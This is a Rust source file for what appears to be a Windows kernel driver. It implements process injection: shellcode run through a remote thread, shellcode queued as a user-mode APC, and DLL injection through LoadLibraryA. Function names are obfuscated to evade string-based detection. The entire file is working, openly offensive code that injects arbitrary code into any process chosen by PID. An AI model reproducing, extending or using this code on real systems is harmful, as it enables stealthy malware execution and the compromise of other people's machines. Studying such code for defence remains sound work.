#![allow(non_snake_case)]

use {
    crate::{
        includes::{
            enums::KAPC_ENVIROMENT::OriginalApcEnvironment, 
            types::{
                ZwCreateThreadExType, ZwProtectVirtualMemoryType, PKNORMAL_ROUTINE
            }, 
            KeInitializeApc, KeInsertQueueApc, MmCopyVirtualMemory, 
        }, 
        process::Process,
        utils::{find_thread_alertable, find_zw_function, read_file, InitializeObjectAttributes, get_module_peb} 
    }, 
    callbacks::{kernel_apc_callback, user_apc_callback}, 
    core::{ffi::c_void, mem::{size_of, transmute}, ptr::null_mut}, 
    obfstr::obfstr, 
    shared::structs::TargetInjection,
    wdk_sys::{
        ntddk::{
            ExAllocatePool2, IoGetCurrentProcess, ZwAllocateVirtualMemory, 
            ZwClose, ZwOpenProcess
        },
        _MODE::{KernelMode, UserMode}, *
    }, 
};

mod callbacks;

/// Represents shellcode injection
pub struct InjectionShellcode;

impl InjectionShellcode {
    /// Injection Shellcode in Thread.
    ///
    /// # Parameters
    /// - `target`: The target process identifier (PID) and the path containing the injection shellcode.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_thread(target: *mut TargetInjection) -> NTSTATUS {
        let pid = (*target).pid;
        let path = &(*target).path;
        
        let zw_thread_addr = match find_zw_function(obfstr!("NtCreateThreadEx")) {
            Some(addr) => addr as *mut c_void,
            None => return STATUS_UNSUCCESSFUL
        };
       
        let zw_protect_addr = match find_zw_function(obfstr!("NtProtectVirtualMemory")) {
            Some(addr) => addr as *mut c_void,
            None => return STATUS_UNSUCCESSFUL
        };

        let target_eprocess = match Process::new(pid) {
            Some(e_process) => e_process,
            None => return STATUS_UNSUCCESSFUL,
        };
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };

        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return status;
        }

        let shellcode = match read_file(path) {
            Ok(buffer) => buffer,
            Err(error) => return error
        };
        let mut base_address = null_mut();
        let mut region_size = shellcode.len() as u64;
        status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );
        
        let ZwProtectVirtualMemory = transmute::<_, ZwProtectVirtualMemoryType>(zw_protect_addr);
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process,
            transmute(base_address),
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut()
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwCreateThreadEx Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        ZwClose(h_process);
        ZwClose(h_thread);

        STATUS_SUCCESS
    }

    /// Injection Shellcode in APC.
    ///
    /// # Parameters
    /// - `target`: The target process identifier (PID) and the path containing the injection shellcode.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_apc(target: *mut TargetInjection) -> NTSTATUS {
        let pid = (*target).pid;
        let path = &(*target).path;
        let shellcode = match read_file(path) {
            Ok(buffer) => buffer,
            Err(error) => return error
        };
        
        let thread_id = match find_thread_alertable(pid) {
            Some(tid) => tid,
            None => return STATUS_UNSUCCESSFUL
        };

        let target_eprocess = match Process::new(pid) {
            Some(e_process) => e_process,
            None => return STATUS_UNSUCCESSFUL,
        };
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };

        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return status;
        }

        let mut base_address = null_mut();
        let mut region_size = shellcode.len() as u64;
        status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            return status;
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            shellcode.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            shellcode.len() as u64,
            KernelMode as i8,
            &mut result_number,
        );

        let user_apc = ExAllocatePool2(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"krts")) as *mut KAPC;
        if user_apc.is_null() {
            log::error!("ExAllocatePool2 (User) Failed");
            return STATUS_UNSUCCESSFUL;
        }

        let kernel_apc = ExAllocatePool2(POOL_FLAG_NON_PAGED, size_of::<KAPC>() as u64, u32::from_be_bytes(*b"urds")) as *mut KAPC;
        if kernel_apc.is_null() {
            log::error!("ExAllocatePool2 (Kernel) Failed");
            return STATUS_UNSUCCESSFUL;
        }

        KeInitializeApc(
            kernel_apc, 
            thread_id, 
            OriginalApcEnvironment, 
            kernel_apc_callback, 
            None, 
            None, 
            KernelMode as i8, 
            null_mut()
        );

        KeInitializeApc(
            user_apc, 
            thread_id, 
            OriginalApcEnvironment, 
            user_apc_callback, 
            None, 
            transmute::<_, PKNORMAL_ROUTINE>(base_address), 
            UserMode as i8, 
            null_mut()
        );

        if !KeInsertQueueApc(user_apc, null_mut(), null_mut(), 0) {
            log::error!("KeInsertQueueApc (User) Failed");
            return STATUS_UNSUCCESSFUL;
        }

        if !KeInsertQueueApc(kernel_apc, null_mut(), null_mut(), 0) {
            log::error!("KeInsertQueueApc (Kernel) Failed");
            return STATUS_UNSUCCESSFUL;
        }

        return STATUS_SUCCESS
    }
}

/// Represents DLL injection
pub struct InjectionDLL;

impl InjectionDLL {
    /// DLL Injection.
    ///
    /// # Parameters
    /// - `target`: The target process identifier (PID) and the path containing the injection dll.
    ///
    /// # Return
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn injection_dll_thread(target: *mut TargetInjection) -> NTSTATUS {
        let pid = (*target).pid;
        let path = (*target).path.as_bytes();
        
        let zw_thread_addr = match find_zw_function(obfstr!("NtCreateThreadEx")) {
            Some(addr) => addr as *mut c_void,
            None => return STATUS_UNSUCCESSFUL
        };

        let zw_protect_addr = match find_zw_function(obfstr!("NtProtectVirtualMemory")) {
            Some(addr) => addr as *mut c_void,
            None => return STATUS_UNSUCCESSFUL
        };
        
        let function_address = match get_module_peb(pid, obfstr!("kernel32.dll"),obfstr!("LoadLibraryA")) {
            Some(addr) => addr,
            None => return STATUS_UNSUCCESSFUL
        };

        let target_eprocess = match Process::new(pid) {
            Some(e_process) => e_process,
            None => return STATUS_UNSUCCESSFUL,
        };
        let mut h_process: HANDLE = null_mut();
        let mut obj_attr = InitializeObjectAttributes(None, 0, None, None, None);
        let mut client_id = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: null_mut(),
        };
        let mut status = ZwOpenProcess(&mut h_process, PROCESS_ALL_ACCESS, &mut obj_attr, &mut client_id);
        if !NT_SUCCESS(status) {
            log::error!("ZwOpenProcess Failed With Status: {status}");
            return status;
        }

        let mut base_address = null_mut();
        let mut region_size = path.len() as u64;
        status = ZwAllocateVirtualMemory(h_process, &mut base_address, 0, &mut region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(status) {
            log::error!("ZwAllocateVirtualMemory Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        let mut result_number = 0;
        MmCopyVirtualMemory(
            IoGetCurrentProcess(),
            path.as_ptr() as _,
            target_eprocess.e_process,
            base_address,
            (path.len() * size_of::<u16>()) as u64,
            KernelMode as i8,
            &mut result_number,
        );

        let ZwProtectVirtualMemory = transmute::<_, ZwProtectVirtualMemoryType>(zw_protect_addr);
        let mut old_protect = 0;
        status = ZwProtectVirtualMemory(h_process, &mut base_address, &mut region_size, PAGE_EXECUTE_READ, &mut old_protect);
        if !NT_SUCCESS(status) {
            log::error!("ZwProtectVirtualMemory Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        let ZwCreateThreadEx = transmute::<_, ZwCreateThreadExType>(zw_thread_addr);
        let mut h_thread = null_mut();
        let mut obj_attr  = InitializeObjectAttributes(None, 0, None, None, None);
        status = ZwCreateThreadEx(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            &mut obj_attr,
            h_process,
            transmute(function_address),
            base_address,
            0,
            0,
            0,
            0,
            null_mut()
        );
        if !NT_SUCCESS(status) {
            log::error!("ZwCreateThreadEx Failed With Status: {status}");
            ZwClose(h_process);
            return status;
        }

        ZwClose(h_process);
        ZwClose(h_thread);

        STATUS_SUCCESS
    }
}
